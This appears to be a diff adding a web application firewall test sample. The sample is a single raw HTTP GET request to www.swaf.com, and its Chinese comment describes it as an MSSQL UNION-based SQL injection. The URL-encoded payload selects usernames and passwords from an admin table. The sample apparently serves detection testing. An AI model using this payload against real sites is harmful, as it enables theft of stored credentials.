@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506387
+# 攻击者基于union查询，将"union select username,password from mydb..admin"语句注入到 SQL 查询参数中，查询表中用户名密码信息。
+GET /?id=1%27%20union%20select%20username%2Cpassword%20from%20mydb..admin&bid=hd_tag_m8mv23wj HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23wj
+RM-PRO-Token: 87165712ca3f14e38d8783ebad1ef7ce
+RM-PRO-Time: 1742808350254
+User-Agent: curl/7.83.1
+
